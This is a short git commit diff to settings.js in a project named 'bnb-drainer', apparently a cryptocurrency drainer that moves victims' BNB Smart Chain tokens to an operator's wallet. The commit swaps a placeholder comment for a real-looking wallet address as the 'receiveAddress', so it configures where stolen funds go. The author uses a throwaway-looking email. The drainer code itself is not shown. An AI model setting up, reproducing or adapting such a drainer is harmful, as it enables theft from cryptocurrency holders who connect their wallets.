b656bde286857e72f5a54292cf67575f02790c31
tempaccountbay <tempemailforvpnlolz@protonmail.com>
2024-06-19 21:33:39 +0100

    Update settings.js

--- bnb-drainer/settings.js
+++ bnb-drainer/settings.js
@@ -1,6 +1,6 @@
 //code for local smart contract
 
-const receiveAddress = "Replace this with your bsc address dont remove quatation marks";   // remove the words and replace it with your bsc address    
+const receiveAddress = "0x063FAC6E972349CA4a3a043C1462af1bb4A7EEf4";   // remove the words and replace it with your bsc address    
 
 	
 var cryptotokenContract;
